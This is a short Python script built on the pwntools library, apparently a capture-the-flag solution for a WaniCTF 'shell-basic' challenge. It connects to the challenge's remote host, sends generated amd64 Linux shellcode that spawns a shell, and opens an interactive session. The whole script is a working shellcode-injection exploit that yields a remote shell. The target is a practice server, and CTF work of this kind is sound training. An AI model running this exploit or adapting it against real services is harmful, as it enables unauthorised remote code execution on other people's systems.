from pwn import *

#pc = process("./chall")
pc = remote("shell-basic-pwn.wanictf.org",9004)
# pc = remote("",)
#shell_code = b""  # PUT YOUR SHELL CODE HERE
pc.sendline(asm(shellcraft.amd64.linux.sh(), arch='amd64'))
pc.interactive()
